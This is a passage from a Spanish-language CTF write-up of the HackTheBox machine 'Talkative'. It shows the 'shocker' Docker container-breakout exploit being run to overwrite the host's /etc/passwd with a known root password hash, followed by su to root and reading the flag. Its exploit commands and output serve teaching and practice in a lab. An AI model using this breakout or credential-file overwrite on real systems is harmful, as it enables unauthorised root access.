tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
saul:x:1000:1000:Saul,,,:/home/saul:/bin/bash
^C
</code></pre></div><p>Luego, ejecutamos el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@c150397ccd63:~# ./shocker2 /etc/passwd passwd
[***] docker VMM-container breakout Po(C) 2014 [***]
[***] The tea from the 90's kicks your sekurity again. [***]
[***] If you have pending sec consulting, I'll happily [***]
[***] forward to my friends who drink secury-tea too! [***]

&lt;enter&gt;

[*] Resolving 'etc/passwd'
[*] Found lib32
[*] Found ..
[*] Found lost+found
...
[*] Found etc
[+] Match: etc ino=393217
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};  
[*] Resolving 'passwd'
[*] Found modules-load.d
[*] Found lsb-release
[*] Found rsyslog.conf
...
[*] Found environment
[*] Found passwd
[+] Match: passwd ino=394935
[*] Brute forcing remaining 32bit. This can take a while...
[*] (passwd) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0xb7, 0x06, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0xb7, 0x06, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00};
Success!!
</code></pre></div><p>Como resultado, el archivo <code>/etc/passswd</code> ha cambiado (desde la sesión de SSH):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">saul@talkative:/tmp$ head -1 /etc/passwd
root:ftb88guy6zk6E:0:0:root:/root:/bin/bash  
</code></pre></div><p>Ahora simplemente podemos cambiarnos al usuario <code>root</code> (contraseña: <code>asdf</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">saul@talkative:/tmp$ su root
Password:
root@talkative:/tmp# cat /root/root.txt  
b020908bd16e6dc4937e2b5a689c3b70
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#enumeración-del-contenedor">Enumeración del contenedor</a></li><li><a href="#enumerando-más-servicios">Enumerando más servicios</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#enumeración-de-red">Enumeración de red</a></li><li><a href="#acceso-mediante-ssh">Acceso mediante SSH</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a><ul><li><a href="#enumeración-de-mongodb">Enumeración de MongoDB</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#accediendo-a-rocketchat-como-administrador">Accediendo a Rocket.Chat como administrador</a></li><li><a href="#explotación-de-_capabilities_">Explotación de <em>capabilities</em></a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>